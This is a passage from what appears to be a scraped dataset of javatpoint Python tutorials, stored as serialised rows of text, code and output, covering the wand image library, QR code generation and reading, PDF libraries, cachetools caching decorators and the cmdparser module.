clone() function to make the image. We have then used the flip() function on the cloned image and saved the resultant image in the file using the save() function.', 'In the above snippet of code, we have imported the required modules from the wand library. We have then used the Drawing() function to draw a circle. We have then used different attributes specifying the dimensions, color, and outline color. We have then used the Image() function specifying the height, width, and background color and saved the resultant image for the users using the save() function.']","['$ pip install wand', '$ sudo apt-get install libmagickwand-dev', '$ brew install imagemagick', '$ sudo port install imagemagick', '$ export MAGICK_HOME=/opt/local', '# importing the required module', 'import wand', '$ python .py', '# Importing library from the wand', 'from wand.image import Image', '# Importing the image', ""with Image(filename ='jtp_logo.png') as my_pic:"", '# Reading the image to fetch original dimensions', ""print('Height of the image:', my_pic.height)"", ""print('Width of the image:', my_pic.width)"", '# Importing library from the wand', 'from wand.image import Image', '# Importing the image', ""with Image(filename ='jtp_logo.png') as my_pic:"", '# Invoking blur function with radius 0 and sigma 3', 'my_pic.blur(radius = 0, sigma = 3)', '# saving the processed iamge', 'my_pic.save(filename =""blur_img.png"")', '# Importing library from the wand', 'from wand.image import Image', '# Importing the image', ""with Image(filename ='jtp_logo.png') as my_pic:"", '# Cloning the image in order to process', 'with my_pic.clone() as my_flip:', '# Invoking flip function', 'my_flip.flip()', '# Saving the image', ""my_flip.save(filename = 'flip-jtp.jpg')"", '# Importing libraries from the wand', 'from wand.image import Image', 'from wand.drawing import Drawing', 'from wand.color import Color', 'with Drawing() as img_draw:', '# Setting Stroke color the circle to black', ""img_draw.stroke_color = Color('black')"", '# Setting Width of the circlw to 3', 'img_draw.stroke_width = 3', ""# Setting the fill color to 'Yellow'"", ""img_draw.fill_color = Color('yellow')"", '# Invoking the Circle function with center', '# at 250, 250 and radius 125', 'img_draw.circle((250, 250), # Center point', '(125, 125)) # Perimeter point', 'with Image(', 'width = 420,', 'height = 420,', ""background = Color('green')"", ') as my_pic:', 'img_draw(my_pic)', ""my_pic.save(filename = 'img-circle.jpg')""]","['Height of the image: 33', 'Width of the image: 150']",[],"['|||The wand library is used to Read/Write images of various formats, and it is also used to convert images from one form to another.|||It also supports Image Scaling and Cropping.|||This library adds simple effects to the images.|||This library also adds special effects to the images.|||It is also used to transform images.|||It also supports other color enhancements.|||']"
368,['Generate a QR Code using Python'],"['In the following tutorial, we will learn to generate and read a QR code using the Python programming language.']","['https://www.javatpoint.com/best-python-pdf-library', 'https://www.javatpoint.com/python-wand-library', 'https://www.javatpoint.com/best-python-pdf-library', 'https://www.javatpoint.com/python-wand-library', 'https://www.javatpoint.com/best-python-pdf-library']","['https://static.javatpoint.com/python/images/generate-a-qr-code-using-python1.png', 'https://static.javatpoint.com/python/images/generate-a-qr-code-using-python2.png']",[],"['Understanding the QR Code', 'Generating QR Code using Python']","['Installing the Python qrcode package', 'Verifying the Installation', 'Generating a Simple QR Code', 'Generating an Advanced QR Code', 'How to read a QR Code?']",[],"[""So, let's get started."", 'However, in order to start working with the package, we have to install it.', 'We can install the qrcode package with the help of the pip installer using the following command:', 'The package will be installed in the system as the version of Python and pip.', 'In order to check whether the package has been installed in the system properly or not, we can try importing the package and execute the program.', 'Once the installation is complete, create a new Python file and type the following syntax in it.', 'Now, save the file and run the file using the following command in the command prompt.', 'Now, let us understand start working with the qrcode library.', 'We can generate a simple QR code using the make function of qrcode and pass the data as its parameter.', 'Let us consider the following example that produces a QR code that reads ""Welcome to Javatpoint"".', 'Explanation:', 'We can use the smartphone in order to read the above QR code.', 'Caution: Do not use the smartphone to read random QR codes because they may contain malicious code/links.', 'The programmers can customize a QR code using a QRCode object which consists of the parameters shown in the following table:', 'We can use the following functions of the QRCode object in order to create a QR code.', 'Let us consider the following example in order to generate a QR code which points towards the Python tutorial.', 'Explanation:', 'Let us consider the snippet of code for the same.', 'Explanation:', 'As a result, the detectAndDecode function returns the content of the QR code, coordinates of the corners of the box, and binarized QR code.']","['Python is a programming language that provides different modules and packages that allow us to generate a QR code. For this tutorial, we will be working with the qrcode package in order to generate the code.', 'If the program runs without raising any import error, the module is installed properly. Else it is recommended to reinstall the package and refer to its official documentation.', 'In the above snippet of code, we have imported the qrcode library and defined a variable that uses the make() function of the qrcode library to generate a QR code. We have then saved the code using the save() function in the directory.', 'We will utilize the OpenCV library in order to read the QR code. If the package is not installed in the system, we can use the following command in order to install it using the pip installer:', 'Once the installation is done, we can head onto the decoding section of the QR code. In order to decode the code, we will be using the detectAndDecode function of QRCodeDetector object of OpenCV.']","['In the above snippet of code, we have imported the qrcode library. We have then created an instance of the QRCode class of the qrcode library. We have used different parameters in order to customize the QR code. We have then used the add_data() function to include the information for the QR code. We have also used the make() and make_image() functions to generate the QR code image. At last, we have saved the image file in the directory using the save() function.', 'In the above snippet of code, we have imported the cv2 library. We have then used the imread() function to read the image from the directory and the QRCodeDectector() function to detect the QR code in the image. We have then used the detectAndDecode() function and printed the value for the users.']","['$ pip install qrcode', '# importing the required module', 'import qrcode', '$ python <file-name>.py', '# importing the qrcode library', 'import qrcode', '# generating a QR code using the make() function', 'qr_img = qrcode.make(""Welcome to Javatpoint."")', '# saving the image file', 'qr_img.save(""qr-img.jpg"")', '# importing the qrcode module', 'import qrcode', '# creating a QRCode object', 'obj_qr = qrcode.QRCode(', 'version = 1,', 'error_correction = qrcode.constants.ERROR_CORRECT_L,', 'box_size = 10,', 'border = 4,', '# using the add_data() function', 'obj_qr.add_data(""https://www.javatpoint.com/python-tutorial"")', '# using the make() function', 'obj_qr.make(fit = True)', '# using the make_image() function', 'qr_img = obj_qr.make_image(fill_color = ""cyan"", back_color = ""black"")', '# saving the QR code image', 'qr_img.save(""qr-img1.png"")', '$ pip install cv2', '# importing the OpenCV library', 'import cv2', '# reading the image', 'qr_img = cv2.imread(""qr-img1.png"")', '# using the QRCodeDetector() function', 'qr_det = cv2.QRCodeDetector()', '# using the detectAndDecode() function', 'val, pts, st_code = qr_det.detectAndDecode(qr_img)', '# printing the value', 'print(""Information:"", val)']",['Information: https://www.javatpoint.com/python-tutorial'],"['S.No.|||Parameter|||Description&&&1|||version|||There are forty (40) versions of the QR code, which regulates the size of the code. Version 1 is the smallest, whereas version 40 is the largest. Version 1 will generate a 21x21 matrix QR code.&&&2|||error_correction||||||This parameter is used to control the Error Correction utilized for the QR code. This varies from 7% to 30% correction of the errors as below:||||||ERROR_CORRECT_L: up to 7%|||ERROR_CORRECT_M: up to 15%|||ERROR_CORRECT_Q: up to 25%|||ERROR_CORRECT_H: up to 30%||||||&&&3|||box_size|||This parameter is used to regulate the number of pixels in the individual block of the QR code.&&&4|||border|||This parameter is used to control the thickness of the border. The default border is 4 pixels thick.', 'S.No.|||Functions|||Description&&&1|||add_data()|||We can pass the content of the QR code as a parameter to this function.&&&2|||make()||||||In case where we are not sure about which version of QR code to utilize, we can set automatically the version by:||||||Setting version argument to None, and|||Setting fit argument of the make() function to True.||||||&&&3|||make_image()|||This function is used to generate the QR code. We can also use it in order to set the fill color and background color of the QR code with the help of the fill_color and back_color parameters.']","['|||QR code is a machine-readable barcode designed in two-dimensional pixelated form.|||The QR code can be used to store a range of data.|||QR in QR code is abbreviated for Quick Response.|||QR code was invented in the year 1994 by Masahiro Hara, a Japanese engineer from Automobile Manufacturer Denso Wave, in order to track the movement of car parts.|||The popularity of the QR code has increased in the later 2010s with improvement in optical proficiencies of Mobile Phones and their extensive acceptance.|||At the moment, QR codes are being utilized for a wide range of applications such as making online payments, checking hotel menus, sharing Wi-Fi passwords, obtaining cost and other information of products, and a lot more.|||QR codes have become so famous that now every new smartphone comes with a built-in QR code reader.|||']"
369,['Best Python PDF Library'],"['As Data Scientists, we may not stick to data format. PDFs, short for Portable Document Format files, are a good source of data. There are many organizations that release their data in PDFs only. As Artificial Intelligence is expanding, we require more data for prediction and classification. Thus, it could be a blunder if we ignore PDFs as data sources. Processing PDF is a bit complicated task; however, we can leverage the APIs discussed in this tutorial to make things easier. This tutorial will provide a brief knowledge of the different Python PDF libraries available for a Data Scientist for PDF processing using the Python programming language.']","['https://www.javatpoint.com/python-cachetools-module', 'https://www.javatpoint.com/generate-a-qr-code-using-python', 'https://www.javatpoint.com/python-cachetools-module', 'https://www.javatpoint.com/generate-a-qr-code-using-python', 'https://www.javatpoint.com/python-cachetools-module']",[],[],"['Some PDF Libraries in Python', 'Why Python for PDF processing?']","['The PDFMiner library', 'The PyPDF4 library', 'The pdfrw library', 'The Slate library', 'The PDFQuery library']",[],"[""So, let's get begun."", 'We can install the PDFMiner library using the following command with the pip installer:', 'We can install the PyPDF4 library using the following command with the pip installer:', 'We can install the pdfrw library using the following command with the pip installer:', 'Slate offers one class - PDF. PDF accepts a file-like object and will extract all text from the document, presenting every page as a text string.', 'We can install the pdfquery library using the following command with the pip installer:']","['There are various PDF libraries available in the Python programming language. In this section, we will be discussing about some of the best PDF libraries that we can use to process PDF files in Python. These libraries are as follows:', 'The PDFQuery library is considered among the fastest Python scraping library. It acts as a light wrapper around pdfminer, pyquery, and lxml. It is designed in order to extract data reliably from sets of PDFs with as little code as possible.']","['PDFMiner is a wonderful library for PDF processing in Python. It is easy to install and use. This tool is used to extract information from PDF documents. Unlike other PDF-associated utilities, it mainly centered on retrieving and analyzing text data. The PDFMiner library allows the programmers to extract the precise location of text in a page, along with other details like fonts or lines. It involves a PDF converter that can transform PDF files into other text formats (like HTML). It has an extensible PDF parser that can be utilized for purposes other than text analysis.', ""PyPDF4 is a quite extensible PDF library in Python. It is a pure-python PDF library that is capable of splitting, combining together, cropping, and transforming the pages of PDF files. It can also insert custom data and viewing options along with PDF files' encryption and decryption features. We can use this library to get text and metadata from PDFs as well as combine whole files together."", 'Pdfrw is another Python PDF library with the same features as the two mentioned above. Apart from those similarities, the pdfrw library has its own USPs (Unique Selling Points). Actually, the need for Application Programming Interface relies on the use case.', 'Slate is another Python PDF library that helps in simplifying the procedure of text extraction from PDF files. This library acts as a wrapper implementation of the PDFMiner library. As we know, no API is perfect, and there were some deficiencies in PDFMiner; and however, Slate addresses them in a beautiful way.', 'As we know, PDF processing lies within text analytics. There is a wide range of Text Analytics libraries or frameworks that are designed in the Programming language like Python only, and this provides leverage to text analytics. In addition to this, we can never process a PDF file directly using the existing frameworks of Machine Learning or Natural Language Processing unless they are proving an explicit interface for this. We have to convert PDF to text first, and we can easily achieve this with the help of any of the libraries mentioned earlier.']","['$ pip install pdfminer', '$ pip install pypdf4', '$ pip install pdfrw', '$ pip install pdfquery']",[],[],['|||PDFMiner|||PyPDF4|||Pdfrw|||Slate|||PDFQuery|||']
370,['Python Cachetools Module'],"[""Most of us would have heard the word 'Cache', but not all of us who heard this word know about it. The cache in terms of Computer technology is a software or hardware component that stores the data (of the activities performed on the computer by the user). It is very helpful when future requests are made for the same data because then the same data will be served faster. The data stored in the cache component of the system might be because of the computation performed earlier, or a copy of the same data is stored somewhere else. So that's how we can see how the cache is important for faster computing and better results in less time. Cache occupies very little compared to the actual size of the data, and therefore it becomes more useful to users.""]","['https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/best-python-pdf-library', 'https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/best-python-pdf-library', 'https://www.javatpoint.com/python-cmdparser-module']","['https://static.javatpoint.com/python/images/python-cachetools-module.png', 'https://static.javatpoint.com/python/images/python-cachetools-module2.png']",[],"['Cachetools Module in Python', 'Conclusion']","['Cachetools Module: Introduction', 'Cachetools Module: Installation', 'Cachetools Module: Functions', 'Cached Function', 'TTLCache Function', 'RRCache', 'LRUCache', 'LFUCache']",[],"['When we press the enter key, the pip installer will start installing the Cachetools Module in our system through the terminal.', 'Following are the five functions present inside the Cachetools Module of Python:', 'Now, we will study all the functions mentioned above in detail and understand their working by using each of them in a Python program.', 'Following is the syntax for using cached decorator function inside a Python program:', ""Now, let's use this cached decorator inside a Python program to understand better its working and how it saves our time."", 'Example 1:', 'Look at the following program for understanding the implementation of cached decorator:', 'Explanation:', 'Following is the syntax for using TTLCache decorator function inside a Python program:', ""Now, let's use this TTLCache decorator inside a Python program to understand its working and how it is useful to us."", 'Example 2:', 'Look at the following program for understanding the implementation of the TTLCache function:', 'Explanation:', 'Syntax: Following is the syntax for using RRCache decorator function inside a Python program:', ""Now, let's use this RRCache decorator inside a Python program to understand its working and how it is useful to us."", 'Example 3: Look at the following program for understanding the implementation of the RRCache function:', 'Explanation:', 'Syntax: Following is the syntax for using LRUCache decorator function inside a Python program:', 'Parameters: LRUCache decorator takes only one argument, i.e., maxsize, and it set how many recently called functions will be stored in the cache.', ""Now, let's use this LRUCache decorator inside a Python program to understand its working and how it is useful to us."", 'Example 4:', 'Look at the following program for understanding the implementation of the LRUCache function:', 'Explanation:', 'We can visualize the variations in the result that are occurred due to the LRUCache decorator.', 'Syntax: Following is the syntax for using LFUCache decorator function inside a Python program:', ""Now, let's use this LFUCache decorator inside a Python program to understand its working and how it is useful to us."", 'Example 5:', 'Look at the following program for understanding the implementation of the LFUCache function:', 'Explanation:', 'We can visualize the variations in the result that are occurred due to the LFUCache decorator.']","['As we can see, Cachetools Module is successfully installed into our system, and now we can call this module in a Python program to deal with cache present in our system through Python.', 'In the output, we can see the behaviour and functionality of the RRCache decorator as it is dropping the cache randomly at any call of the function, and many times function is called from the cache memory stored in the RRCache.']","['Python provides us with various modules by which we can deal with cache memory present in our system. Python also provides us modules where we can use the cache memory for faster computing and save time. One of such Python modules is Cachetools Module in Python, and we are going to learn about this module in this tutorial. We will learn in brief detail about the Cachetools Module & its functions in Python and how these functions are helpful in performing various tasks with the help of cache present in the system.', ""Cachetools is a Python module that provides us with various decorators (that are the functions available in this module) and memorizing collections. Cachetools help us deal with the cache present in our system effectively, and we can use this cache with the Cachetools module for faster processing of Python programs. Cachetools Module also includes some variants of the Functools Module's (another Python module) @lru_cache decorator function."", 'Cachetools Module is not an in-built module of Python, and therefore if we want to use this module and its functions in our system, we have to install this module first. Here, in this section, we will install Cachetools Module through the command prompt terminal with the pip installer. First, we have to open the command prompt terminal, and then we have to write the following pip command inside the terminal:', 'Here, we will only talk about the functions present in the Cachetools Module of Python. We should note here that these functions are decorator function types in Python, and when we use these functions, they will be used as decorator functions in the program.', 'The cached function of the Cachetools Module is used as a decorator function in Python, and it is by default perform a simple cache in the program. When we call a function using the cached decorator, it will cache the function we called for using it later as a cache do.', 'Parameters: In the cached decorator, we use a default function with any_funct() name (We can even give parameters inside the function). Instead of a pass statement, while using the cached decorator inside a Python program, we will write a logical code inside the default function.', 'We have first imported the cached decorator function from the Cachetools Module to use it in our program. We have also imported the time module in the program to keep count on time and check how cached makes calling of function faster. After that, we defined a default function and used logical code to calculate value through operation and returned the value after the operation. When we used a parameter in this fiban() function to find an actual value, we used the time() function before finding out how much time it takes to perform this operation. Then, we printed the value we got in operation and the total time it took to perform the operation. After that, we have used the cached decorator function and defined the same default function, i.e., fiban() function, with the same logic inside it. Now, we again used the time function to calculate the total time it will take to call the function. Then, after giving a parameter inside the fiban() function, we printed the operation and the total time it took to perform the operation with the cached decorator.', ""We can see in the output that when we called the function without cached, it took much more time than when we called the function using the cached decorator (When both functions are same, having exact logic and have the same parameter when called). That's how cached decorator helps us by saving the function in cache memory and saves a lot of time when it is called again."", 'TTLCache is also known as ""Time to Live"" Cache, and it is also a decorator function included in the Cachetools Module package. It also works on the cache present in the system while we are calling a function inside a program. But it works very differently than the previous function of the Cachetools Module, and we can see this in the syntax of both functions.', 'Parameters: Unlike the Cached decorator syntax, we have to give a total of two parameters inside the TTLCache decorator function. We can also see that we have specified the cache type to TTLCache before using the parameters in the function. Following are the parameters that we have to use inside the TTLCache decorator:', ""We have imported both cached and TTLCache decorator from the Cachetools Module in our program along with the Time module to keep count on time taken for calling the function. We used the TTLCache decorator by defining its parameters as following: defined maximize parameter equals 64 and total time for which cache is stored is equal to 90 seconds. After that, we have defined a default function to perform the operation, and then we have used the time() function to calculate the time taken to call the function. After that, we called the function twice in the print statement. Then, we gave a break in calling the function a third time using the sleep() function. We used a 100-second break because, in the TTLCache function's parameter, we gave 90 seconds to store cache."", 'We can see in the output that when in the second time we called the function, it called from the cache memory of the TTLCache decorator. But when we gave a break, it again called from the program as TTLCache no longer storing the cache memory for the function.', 'RRCache is short for Random Replacement Cache, and as the name suggests, RRCache is one of the types of caching technique in which the function randomly chooses from the items present in the cache memory and discards them. The RRCache function performs this operation randomly to free up some space in the cache memory whenever required.', 'Parameters: The RRCache have one necessary parameter, i.e., maxsize, which is the same as the maxsize parameter we used in the TTLCache decorator function. Other than this parameter, RRCache also takes an optional \'choice parameter\', which is by default set to ""random.choice\' in the program.', 'The LRUCache decorator function is used inside the cached decorator like the other two functions we have learned about. LRUCache stands for Least Recently Used Cache, and as the name suggests, this decorator function keeps the cache for functions used recently in the program.', ""We have called the default function exactly 2 times more than the maxsize parameter we defined for the LRUCache function, i.e., 7 times. This is because, first, when the function is called, it is stored in the cache memory of LRUCache for and after that, for the next 5 times function will be called from the cache present in the LRUCache decorator. But, for the 7th time, the default function will be called from the program's memory as now it exceeds the maxsize we defined for the LRUCache, i.e., 5."", 'LFUCache is one more type of caching technique which stands for Least Frequently Used Cache, and it is also called inside the cached decorator. LFUCache caching technique is used to retrieve how frequently (often) an item or function is called in the program. In the LFUCache caching technique, items or functions called least often in the program are discarded from the cache memory, and this operation is performed to free up some space in the cache.', 'Parameters: LFUCache decorator function takes only one argument in it, i.e., maxsize, and it set how many least frequently called functions will be stored in the cache. If an item or function argument is not called in maxsize successive number of times, then it will be discarded from the cache.', ""We have called the default function with argument 3, and after that, we haven't called it for 5 successive times, which is equal to the maxsize argument in the LFUCache function). Therefore, LFUCache will discard the default function with argument 3 from the cache, and it will be called again from the memory of the program."", 'Here, we have completed the Cachetools Module tutorial, and we have learned about all the five functions present in the Cachetools Module. We have learned how functions of the Cachetools Module works inside a Python program and how we can use them to work with the cache memory of the program.']","['pip install cachetools', '@cached(cache = {})', 'def any_funct():', 'pass # Code in the function', '# Import cached from Cachetools Module', 'from cachetools import cached', '# Import time module in the program', 'import time', '# Calling a function without using cache', 'def fiban(n):', 'return n if n<2 else fiban(n-1) + fiban(n-2)', '# Calculating total time for performing operation', 'totalTime1 = time.time()', '# Printing function result', 'print(""Result of operation: "", fiban(31))', '# Total time taken', 'print(""Time Taken by function without cache: "", time.time() - totalTime1)', '# Calling function using cache', '@cached(cache = {})', 'def fiban(n):', 'return n if n<2 else fiban(n-1) + fiban(n-2)', '# Result of operation performed by function', 'totalTime2 = time.time()', 'print(""Result of operation: "", fiban(31))', '# Now total time taken in Operation', 'print(""Time Taken by function with cached: "", time.time() - totalTime2)', '# Working on cache', '@cached(cache = TTLCache(maxsize = 33, ttl = 600))', '# Default function', 'def anyFunct():', 'pass # logical code in the function', '# Import cached and TTLCACHE from Cachetools Module', 'from cachetools import cached, TTLCache', '# Import time module in the program', 'import time', '# Using the TTLCache decorator', '@cached(cache = TTLCache(maxsize = 64, ttl = 90))', '# A default function to carry operations', 'def myFunc(num):', '# Keeping track on total time taken', 'timeTaken = time.time()', 'time.sleep(num)', 'print(""\\nTotal time taken for executing the function: "", time.time() - timeTaken)', 'return (f""I am executed with the function number: {num}"")', '# Calling the default function twice', 'print(myFunc(4))', 'print(myFunc(4))', '# Using sleep function to create a break', 'time.sleep(100)', '# Calling function after break', 'print(myFunc(4))', '# Working on cache', '@cached(cache = RRCache(maxsize = 34))', '# Default function', 'def anyFunct():', 'pass # logical code in the function', '# Import cached and RRCACHE from Cachetools Module', 'from cachetools import cached, RRCache', '# Import time module in the program', 'import time', '# Using the RRCache decorator', '@cached(cache = TTLCache(maxsize = 32))', '# A default function to carry operations', 'def newFunc(m):', '# Keeping track on total time taken', 'timeTaken = time.time()', 'time.sleep(m) # Delay in printing result displays task is under process', 'print(""\\nTotal time taken for executing the function: "", time.time() - timeTaken)', 'return (f""I am executed with the function number: {m}"")', '# Calling the default function in print statement', 'print(newFunc(2))', 'print(newFunc(3))', 'print(newFunc(1))', 'print(newFunc(2))', 'print(newFunc(2))', 'print(newFunc(4))', 'print(newFunc(3))', 'print(newFunc(3))', 'print(newFunc(2))', '# Working on cache', '@cached(cache = LRUCache(maxsize = 4))', '# Cache stored for this Default function', 'def anyFunc():', 'pass # some logical code will be written here', '# Import cached and LRUCACHE from Cachetools Module', 'from cachetools import cached, LRUCache', '# Import time module in the program', 'import time', '# Using the LRUCache decorator function', '@cached(cache = LRUCache(maxsize = 5))', '# A default function to carry operations', 'def newFunc(m):', '# Keeping track on total time taken', 'timeTaken = time.time()', 'time.sleep(m) # Delay in printing result displays task is under process', 'print(""\\nTotal time taken for calling the default function: "", time.time() - timeTaken)', 'return (f""I am executed with the function number: {m}"")', '# Calling the default function in print statement', 'print(newFunc(2))', 'print(newFunc(3))', 'print(newFunc(1))', 'print(newFunc(2))', 'print(newFunc(2))', 'print(newFunc(4))', 'print(newFunc(3))', '# Working on cache', '@cached(cache = LFUCache(maxsize = 5))', '# Cache stored for this Default function', 'def newFunc():', 'pass # some logical code will be written here', '# Import cached and LFUCACHE from Cachetools Module', 'from cachetools import cached, LFUCache', '# Import time module in the program', 'import time', '# Using the LFUCache decorator function', '@cached(cache = LFUCache(maxsize = 5))', '# A default function to carry operations', 'def newFunct(anyNum):', '# Keeping track on total time taken', 'totalTime = time.time()', 'time.sleep(anyNum) # Delay in printing result displays task is under process', 'print(""\\nTotal time taken for calling the default function: "", time.time() - totalTime)', 'return (f""I am executed with the function number: {anyNum}"")', '# Calling the default function in print statement with number parameters', 'print(newFunct(2))', 'print(newFunct(3))', 'print(newFunct(1))', 'print(newFunct(2))', 'print(newFunct(2))', 'print(newFunct(4))', 'print(newFunct(1))', 'print(newFunct(3))', 'print(newFunct(3))', 'print(newFunct(2))']","['Result of operation:  1346269', 'Time Taken by function without cache:  0.8905675411224365', 'Result of operation:  1346269', 'Time Taken by function with cached:  0.015604496002197266', 'Total time taken for executing the function:  4.015438556671143', 'I am executed with the function number: 4', 'I am executed with the function number: 4', 'Total time taken for executing the function:  4.015343904495239', 'I am executed with the function number: 4', 'Total time taken for executing the function:  2.01472806930542', 'I am executed with the function number: 2', 'Total time taken for executing the function:  3.01532244682312', 'I am executed with the function number: 3', 'Total time taken for executing the function:  1.015653133392334', 'I am executed with the function number: 1', 'I am executed with the function number: 2', 'I am executed with the function number: 2', 'Total time taken for executing the function:  4.003695011138916', 'I am executed with the function number: 4', 'I am executed with the function number: 3', 'I am executed with the function number: 3', 'I am executed with the function number: 2', 'Total time taken for calling the default function:  2.0151138305664062', 'I am executed with the function number: 2', 'Total time taken for calling the default function:  3.015472888946533', 'I am executed with the function number: 3', 'Total time taken for calling the default function:  1.0000226497650146', 'I am executed with the function number: 1', 'I am executed with the function number: 2', 'I am executed with the function number: 2', 'Total time taken for calling the default function:  4.015437841415405', 'I am executed with the function number: 4', 'I am executed with the function number: 3', 'Total time taken for calling the default function:  2.01556396484375', 'I am executed with the function number: 2', 'Total time taken for calling the default function:  3.00508451461792', 'I am executed with the function number: 3', 'Total time taken for calling the default function:  1.0156123638153076', 'I am executed with the function number: 1', 'I am executed with the function number: 2', 'I am executed with the function number: 2', 'Total time taken for calling the default function:  4.0026326179504395', 'I am executed with the function number: 4', 'I am executed with the function number: 1', 'I am executed with the function number: 3', 'I am executed with the function number: 3', 'I am executed with the function number: 2']",[],"[""|||cached|||TTLCache|||RRCache|||LRUCache|||LFUCache|||&&&|||maxsize: The maxsize used inside the TTLCache function defines the maximum size of functions that can be stored inside the TTLCache.|||ttl: The value we give inside the 'ttl' parameter states how long the cache for the function will be stored in the system's cache memory. The value we give inside the ttl parameter is in seconds.|||""]"
371,['Python Cmdparser Module'],"['Sometimes, we have to write commands using the command prompt terminal, and this terminal which interprets the inline commands written for various purposes, is called command interpreters. We can write and build a framework which we will use to write line-oriented command interpreters, and for achieving this task, sometimes we have to use classes. A class that provides a framework for command interpreters so that we can write line-oriented commands is known as the cmd class. Now, many of us wonder what the uses of cmd class and how it is helpful to us are. A cmd class is very useful for creating prototypes, test harnesses that will be later wrapped, and administrative tools present in a more sophisticated manner. Therefore, to perform all these tasks and create these tools, we have to use a command-line interface, and this can be easily built using a cmd class.']","['https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/python-cachetools-module', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/python-cachetools-module', 'https://www.javatpoint.com/python-dash-module']","['https://static.javatpoint.com/python/images/python-cmdparser-module.png', 'https://static.javatpoint.com/python/images/python-cmdparser-module2.png', 'https://static.javatpoint.com/python/images/python-cmdparser-module3.png']",[],"['Cmdparser Module in Python', 'Cmdparser Module: Overview of datetimeparser Sub-Module:', 'Conclusion']","['Cmdparser Module: Installation', 'Cmdparser Module: Overview of cmdparser sub-module:', 'Classes in the cmdparser sub-module:', 'Classes in the datetimeparser Sub-Module:']",[],"['Following are the several advantages of using a command-line interface or interpreter:', 'The Cmdparser Module of Python contains the two sub-modules or Python packages that are following:', 'Write the following command in the terminal shell to install the Cmdparser Module in our system through pip installer:', 'Explanation:', 'Example 2: Look at the following Python program where we created a parse tree with dynamic tokens to accept a dynamic list of strings:', 'Explanation:', 'Following are the examples of types of dates in the datetimeparser sub-module:']","['In this tutorial, we will learn about the implementation and working of both sub-modules of the Cmdparser package and use them in a Python program to create a simple parse tree.', 'After writing the command given above, we have to press the enter key and wait for some time as it will take a while to install this module successfully.', 'cmdparser sub-module from the Cmdparser package of Python allows us to create parse tree structure with the help of textual command specifications like the one given below:', 'Example: Look at the following Python program where we have created a parse tree from the cmdparser sub-module and then matched tokens with the parse tree:', 'Now, as we can see in the output, the rest of the static tokens from the parse is printed, and before that, an error for the ""uvwx"" token is also printed.', 'Following are the four classes available inside the cmdparser sub-package that are suitable as base classes for creating user-derived tokens (static as well as dynamic):', 'Following are the five classes available inside the datetimeparser sub-package of the Cmdparser Module that is suitable as base classes for creating user-derived tokens (static as well as dynamic):']","['The use of command-line interpreters has become very rare because Graphical User Interface (GUI) in most applications has been increased nowadays. Therefore, users are more attracted to using these applications only instead of using a simple line-oriented command interpreter but using a command-line interface has its own advantages.', ""These are some major advantages of command-line interpreters, and that's why most users even today prefer them over many GUI-based applications whose interfaces are way more attractive. After seeing these advantages, we can understand and conclude that it is how much useful to build a command-line interpreter with the cmd class. It will not only help us in our professional life and professional tasks, but it will also be helpful in our personal projects. Many of us would be surprised to hear that the cmd class is also present in the Python packages, and therefore it is possible to create a framework for command-line interface using a Python program. We are going to learn about the Cmdparser module in Python in which we will see the use of cmd class, and we will build a framework for command line interpreter using this module."", 'Cmdparser Module is a Python package that comes with two sub-modules in it which are very useful for us to write text command parsers and create a framework for the command-line interface. Cmdparser Module also uses the cmd class & functions of this in it, and we will use these functions in the programs to build a parse tree to perform name matching operation. Cmdparser Module in Python uses the built-in cmd module of Python and calls it for creating a framework for the command-line interface.', 'If we want to use functions and sub-modules of the Cmdparser Module in a Python program, we should ensure that this module is present in our system because it is not an in-built module of Python. Therefore, if the Cmdparser Module is not already present in our system, we have to install it to move further with the implementation part of its sub-modules. We can install the Cmdparser Module through various installation processes, but here we will use the pip installer to perform this task because it is the easiest and simplest way to do it.', 'The Cmdparser Module is now successfully installed in our system as we can see that, and now, we can work with it and its sub-modules by importing it into the program. We will first look at the overview and implementation of the cmdparser sub-module of the Cmdparser package, and then we will go through the overview of the datetimeparser sub-module.', ""We can check this particular command string using the parse tree structures. The cmdparser sub-module also allows us to validate partial command strings' completion to be listed for the parse tree. Let's understand this concept by making a parse tree from a Python program using the textual command specification we have listed above."", 'We have first imported the cmdparser sub-module from the cmdparser package to create a parse tree with tokens in the program. After that, we have created a sample parse tree in the parseTree variable using the parse_spec() function from the cmdparser package. Inside the parse tree, we have only defined static tokens and used them later for matching. After that, we used the parse_match() of the cmdparser package to match the tokens from the parse tree we defined. In the second matching, the parse tree will throw an error as ""uvwx"" is not a static token defined in the package. In last, we used the parse_completions() function to complete the rest of the tokens from the parse tree. This function will print the rest of the static tokens of the parse tree in the output.', 'We used static tokens in the parse, which we have created in the example given above, but we can also create parse trees with the help of dynamic tokens using the Cmdparser Module. While we are creating a parse tree having dynamic tokens in it, we can set up the dynamic tokens where the list of strings is accepted, and this list of strings in the dynamic tokens changes over time. We can also use dynamic tokens where the arbitrary string or list of strings can be accepted while we are dealing with a fixed token string. If we want to look at the specifications of all the classes available in the Cmdparser Module for setting up dynamic tokens, we can check the docstrings of the module. Here, we will understand this by creating a parse tree with dynamic tokens using the Cmdparser Module classes. Look at the following example where we created a parse tree using dynamic tokens from the Cmdparser Module.', 'After importing the cmdparser sub-module package from the Cmdparser Module, we created a class with fruit names as tokens of the parse tree in the program. The fruit names we defined inside the \'tokenOfFurits\' class will work as the static tokens of the parse tree, and for retrieving the values of fruit names from the class, we have defined a default function inside the class. Then, we have defined another function (myIdentificationFactory) that will accept dynamic tokens in the parse tree, and it will accept numeric values (numbers) as matching values. To set up dynamic tokens with a numeric value, we used IntegerToken() function from the Cmdparser package, and thus it will make this a dynamic token that will accept any integer value as a matching value from the parse tree. After that, we used parse_spec() function to create the parse tree having number and fruit as dynamic tokens and ""keep"" & ""packet"" as static tokens. Then, we used the check_match() function and gave token values in it to perform the matching operation from the parse tree. We can see in the output that when we haven\'t provided a number, it will throw a matching error. In last, when we used the get_completions() function with the parse tree, all the fruit values used as a token is printed in the output.', 'Datetimeparser sub-module from the Cmdparser package adds some specific token types in the creation of parse tree, which will help to parse human-readable specifications related to date and time format. In the datetimeparser sub-module, both absolute and relative types of dates are specified, and these types can be converted to other instances also whenever required and as appropriate.', 'We read about Cmdparser Module in this tutorial, and we learned how we could create an interface of cmdparser using the packages of this Module. We learned about both cmdparser and datetimeparser sub-modules of the Cmdparser package in Python and how these are helpful in creating tokens for the parse tree. In last, we looked at the base classes of both sub-modules of the Cmdparser package and learned how these classes are helpful in parsing the specifications given for a token of the 